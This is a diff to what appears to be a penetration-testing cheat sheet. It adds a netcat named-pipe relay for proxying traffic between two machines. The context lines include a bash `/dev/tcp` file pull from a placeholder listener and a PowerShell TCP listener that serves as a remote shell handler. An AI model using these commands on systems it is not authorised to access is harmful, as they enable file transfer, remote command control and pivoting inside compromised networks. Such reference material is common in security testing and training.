@@ -444,4 +444,38 @@ cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/fil
 & {$LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); Write-Output "Listening on port $LPort..."; $TCPClient = $Listener.AcceptTCPClient(); Write-Output "Client connected."; $NetworkStream = $TCPClient.GetStream(); $StreamWriter = [System.IO.StreamWriter]::new($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = [System.Byte[]]::new(1024); while ($TCPClient.Connected) { try { $Input = Read-Host; $StreamWriter.Write($Input + "`n"); $Count = 0; if ($Input -eq "exit") { break } do { $NetworkStream.ReadTimeout = 50; $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($Data -eq 0) { break }; $Data = [Text.Encoding]::ASCII.GetString($Buffer, 0, $RawData); $Output = $Output + $Data } while ($NetworkStream.DataAvailable); Write-Output $Output; $Output = $null; $Data = $null } catch { continue } } $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop(); Write-Output "Connection closed."}
 ```
 
+##### Proxying Bidirectional Traffic (Linux):
+
+Proxying Machine:
+
+- Create a named pipe
+
+```
+mkfifo %pipename%
+```
+
+- Start `netcat` listeners for each side
+
+```
+nc -lp %port1% < %pipename% | nc -lp %port2% > %pipename%
+```
+
+- East machine connects
+
+```
+nc %proxyip% %port1%
+```
+
+- West machine connects
+
+```
+nc %proxyip% %port2%
+```
+
+- Delete named pipe when done
+
+```
+rm %pipename%
+```
+
 </details>
